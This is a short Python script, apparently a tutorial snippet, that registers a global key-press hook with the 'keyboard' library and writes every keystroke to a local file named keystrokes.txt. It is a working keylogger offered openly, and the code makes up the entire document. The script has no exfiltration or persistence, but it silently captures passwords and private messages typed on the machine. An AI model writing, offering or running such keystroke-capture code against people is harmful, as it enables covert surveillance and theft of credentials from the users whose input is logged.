# FIRST IMPORT KEYBOARD MODULE USIG (PIP INSTALL KEYBOARD)
import keyboard # type: ignore


# CREATE TEXT FILE IN SAME DIRECTORY
log_file = 'keystrokes.txt'

# CREATE THE KEY PRESS EVENT FUNCTION
def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.name))


# REGISTER THE KEY PRESS EVENT
keyboard.on_press(on_key_press)

# WAIT FOR KEY PRESSES
keyboard.wait()